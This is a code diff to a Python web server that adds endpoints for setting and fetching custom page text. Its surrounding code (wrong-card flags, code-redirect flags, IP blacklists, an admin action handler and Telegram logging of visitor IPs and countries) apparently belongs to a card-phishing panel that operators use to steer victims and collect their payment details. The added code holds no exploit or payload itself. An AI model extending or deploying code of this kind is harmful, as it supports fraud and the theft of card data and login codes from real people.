@@ -73,6 +73,8 @@ REQUEST_AGAIN_FLAGS = {}
 BLACKLISTED_IPS = set()
 WRONG_CARD_FLAGS = {}
 CODE_REDIRECT_FLAGS = {}
+# --- In-memory storage for custom texts ---
+CUSTOM_TEXTS = {}
 
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     # Визначаємо країну за IP, якщо не передано
@@ -269,6 +271,16 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'false')
             return
+        if self.path.startswith('/get_custom_text'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            text_id = qs.get('text_id', [None])[0]
+            text = CUSTOM_TEXTS.get(text_id, '')
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
+            return
         try:
             super().do_GET()
         except Exception as e:
@@ -422,6 +434,27 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'ok')
             except Exception as e:
                 print(f'[admin_action] Error: {e}')
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
+        elif self.path == '/set_custom_text':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                text_id = data.get('text_id')
+                text = data.get('text')
+                if text_id and text is not None:
+                    CUSTOM_TEXTS[text_id] = text
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no text_id or text')
+            except Exception as e:
                 self.send_response(500)
                 self.end_headers()
                 self.wfile.write(b'error')
